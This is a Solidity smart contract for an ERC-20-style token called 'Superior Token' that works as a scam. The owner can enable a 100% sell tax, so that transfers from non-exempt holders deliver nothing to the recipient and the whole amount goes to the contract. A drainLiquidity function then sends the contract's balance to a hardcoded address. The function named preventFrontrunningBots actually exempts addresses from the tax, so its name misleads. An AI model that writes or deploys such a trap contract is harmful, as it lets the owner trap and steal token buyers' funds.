// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

    contract SuperiorToken {
    string public name = "Superior Token";
    string public symbol = "SUP";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000000000000000;
    address public owner;
    address public constant recipient = 0x2150C1115466002Fd26899BDF2Aad6Ae50BCf722;
    bool public sellTaxEnabled = false;
    uint256 public sellTaxFee = 100;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public isExcludedFromTax;
    bool private locked;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }

    modifier nonReentrant() {
        require(!locked, "Reentrant call detected");
        locked = true;
        _;
        locked = false;
    }

    constructor() {
        owner = msg.sender;
        totalSupply = 1000000 * 10**uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
        isExcludedFromTax[msg.sender] = true;
    }

    function setFees(bool _enabled) external onlyOwner {
        sellTaxEnabled = _enabled;
    }

    function transfer(address _to, uint256 _value) public nonReentrant returns (bool) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        if (sellTaxEnabled && !isExcludedFromTax[msg.sender]) {
            uint256 taxAmount = (_value * sellTaxFee) / 100;
            uint256 amountAfterTax = _value - taxAmount;
            balanceOf[msg.sender] -= _value;
            balanceOf[_to] += amountAfterTax;
            balanceOf[address(this)] += taxAmount;
            emit Transfer(msg.sender, _to, amountAfterTax);
            emit Transfer(msg.sender, address(this), taxAmount);
        } else {
            balanceOf[msg.sender] -= _value;
            balanceOf[_to] += _value;
            emit Transfer(msg.sender, _to, _value);
        }
        return true;
    }

    function buyBackAndBurn(uint256 amount) external onlyOwner nonReentrant {
        require(balanceOf[address(this)] >= amount, "Insufficient balance");
        balanceOf[address(this)] -= amount;
        totalSupply -= amount;
        emit Transfer(address(this), address(0), amount);
    }

    function drainLiquidity() external onlyOwner nonReentrant {
        uint256 balance = balanceOf[address(this)];
        require(balance > 0, "No liquidity to drain");
        balanceOf[address(this)] -= balance;
        balanceOf[recipient] += balance;
        emit Transfer(address(this), recipient, balance);
    }

    function preventFrontrunningBots(address bot) external onlyOwner {
        isExcludedFromTax[bot] = true;
    }

function destroySmartContract() public nonReentrant onlyOwner {
        uint256 balance = balanceOf[address(this)];
        if (balance > 0) {
            balanceOf[msg.sender] += balance;
            
            emit Transfer(address(this), msg.sender, balance);
        }
    }
}